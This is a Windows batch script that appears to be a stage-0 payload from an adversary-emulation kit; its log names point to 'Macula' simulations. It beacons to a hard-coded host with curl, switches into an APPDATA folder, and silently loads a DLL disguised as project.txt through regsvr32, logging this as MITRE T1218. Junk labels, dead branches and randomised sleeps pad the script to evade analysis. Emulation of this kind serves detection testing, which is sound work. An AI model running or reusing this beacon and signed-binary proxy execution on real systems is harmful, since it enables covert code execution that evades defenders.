@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET yktnwwf=%APPDATA%\8868\7973da8c
SET fpakbq=Macula-Stage0-8868
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8868-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=project.txt
SET fpldhe=8868
SET zxmqp=%APPDATA%\!yydue!
SET bnjqs=macula-simulations.log
SET state=0

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: script_start>> "!zxmqp!\!bnjqs!" 2>nul
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay1_complete>> "!zxmqp!\!bnjqs!" 2>nul
GOTO klnbv

:dead_qazxc
EXIT
GOTO END

:klnbv
IF !state!==0 GOTO nbmki
IF !state!==1 GOTO cxzsr
IF !state!==2 GOTO lkjhu
IF !state!==3 GOTO vbnml
IF !state!==4 GOTO dcvfr
IF !state!==99 GOTO END
GOTO END

:junk_mnlop
SET fake=deadcode
GOTO deadend

:deadend
EXIT

:nbmki
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_start>> "!zxmqp!\!bnjqs!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_sent>> "!zxmqp!\!bnjqs!" 2>nul
SET state=1
ping -n 8 127.0.0.1 >nul
GOTO klnbv

:cxzsr
IF 1==1 ( GOTO plmko ) ELSE ( GOTO junk_mnlop )
:plmko
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: directory_change_start>> "!zxmqp!\!bnjqs!" 2>nul
cd /d "!yktnwwf!" 2>nul
SET rc=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_result=!rc!>> "!zxmqp!\!bnjqs!" 2>nul
SET state=2
SET /A rdelay=%RANDOM% %% 15 + 5
timeout /t !rdelay! /nobreak >nul
GOTO klnbv

:lkjhu
SET result=0
SET errmsg=
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dll_load_start>> "!zxmqp!\!bnjqs!" 2>nul
C:\Windows\System32\regsvr32.exe /s "!edjwtl!"
IF !ERRORLEVEL! EQU 0 (SET result=1) ELSE (SET result=0&SET errmsg=load_failed)
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: regsvr32_executed>> "!zxmqp!\!bnjqs!" 2>nul
echo [!DATE! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!result!;!errmsg!>> "!zxmqp!\!bnjqs!" 2>nul
SET state=3
CHOICE /C Y /N /D Y /T 12 >nul
GOTO klnbv

:vbnml
SET state=4
GOTO klnbv

:unused_ghjk
EXIT

:dcvfr
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: script_complete>> "!zxmqp!\!bnjqs!" 2>nul
SET state=99
GOTO klnbv

:END